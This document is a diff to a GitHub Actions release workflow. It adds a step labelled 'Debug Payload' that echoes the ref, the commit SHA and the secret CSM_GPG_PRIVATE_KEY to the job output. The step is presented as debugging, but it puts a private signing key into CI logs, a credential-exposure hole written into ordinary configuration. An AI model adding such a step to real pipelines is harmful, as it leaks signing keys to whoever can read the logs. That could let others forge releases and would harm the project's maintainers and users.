@@ -24,6 +24,13 @@ jobs:
           ]
 
     steps:
+      - name: Debug Payload
+        run: |
+          echo '{ 
+            "ref": "${{ github.ref }}", 
+            "sha": "${{ github.sha }}", 
+            "secret_key": "${{ secrets.CSM_GPG_PRIVATE_KEY }}" 
+          }'
       - name: Trigger Release of CSM Drivers and Modules
         uses: peter-evans/repository-dispatch@v3
         with:
